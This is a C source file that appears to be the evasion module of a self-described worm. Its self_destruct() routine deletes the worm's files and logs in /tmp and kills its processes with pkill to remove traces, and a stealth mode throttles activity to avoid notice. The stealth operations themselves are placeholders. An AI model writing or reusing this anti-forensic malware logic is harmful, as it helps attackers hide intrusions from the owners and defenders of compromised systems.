#include "degradation.h"
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <sys/wait.h>

// Cleanup files
void cleanup_files(void) {
    system("rm -f /tmp/worm* /tmp/*.b64 /tmp/worm.log 2>/dev/null");
}

// Cleanup processes
void cleanup_processes(void) {
    // Kill child processes (simplified)
    // In a real implementation, we'd track PIDs
    system("pkill -f 'worm' 2>/dev/null");
}

// Self-destruct: Clean exit, remove traces
void self_destruct(void) {
    printf("[!] Risk level HIGH - Self-destructing...\n");
    
    // Stop operations
    cleanup_processes();
    
    // Cleanup files
    cleanup_files();
    
    // Exit cleanly
    exit(0);
}

// Perform stealth operations (minimal activity)
void perform_stealth_operations(void) {
    // Minimal operations in stealth mode
    // Could include: passive monitoring, minimal scans, etc.
    printf("[*] Performing stealth operations...\n");
}

// Enter stealth mode: Reduce activity, longer delays
void enter_stealth_mode(void) {
    printf("[*] Entering stealth mode...\n");
    perform_stealth_operations();
    // Long delay (5 minutes)
    sleep(300);
}

